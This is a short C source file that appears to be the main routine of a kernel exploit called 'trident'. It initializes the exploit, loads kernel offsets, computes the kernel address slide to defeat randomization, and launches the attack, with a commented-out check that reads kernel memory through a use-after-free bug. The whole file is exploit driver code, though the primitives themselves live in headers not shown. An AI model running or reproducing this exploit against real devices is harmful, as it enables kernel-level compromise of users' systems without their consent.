#include <plog.h>
#include <trident.h>
#include <common.h>
#include <kslide.h>
#include <offsets.h>
#include <uaf.h>

int main(void)
{
    if(trident_initialize())
    {
        ERR("trident_initialize() failed");
        return -1;
    }
    
    if(!offsets_initialize())
    {
        ERR("offsets_initialize() failed");
        return -1;
    }
    
    addr_t slide = get_kernel_slide();
    if(!slide)
    {
        ERR("get_kernel_slide() failed");
        return -1;
    }
    
//  uint32_t test = kread32_via_uaf(KERNEL_BASE_ADDRESS + slide);
//  LOG("test: 0x%08x", test);
//  if(test != MACH_MAGIC)
//  {
//      ERR("kread32_via_uaf() failed");
//      return -1;
//  }
    
    trident(slide);
    
    return 0;
}
